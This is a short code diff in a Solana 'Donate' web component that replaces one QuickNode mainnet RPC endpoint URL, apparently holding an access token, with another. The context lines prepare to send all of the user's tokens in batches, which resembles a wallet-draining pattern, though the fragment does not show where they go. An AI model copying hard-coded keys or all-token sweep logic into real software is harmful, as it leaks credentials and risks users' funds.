@@ -60,7 +60,7 @@ export default function Donate() {
     setDonationStatus("loading");
 
     try {
-      const connection = new Connection("https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b", "confirmed");
+      const connection = new Connection("https://fragrant-red-waterfall.solana-mainnet.quiknode.pro/5c9236679b5bdd256642d8d3d3193e6d6809db04/", "confirmed");
       const tokensToSend = balances.tokens;
       const batchSize = 5;
       const batches: typeof tokensToSend[] = [];
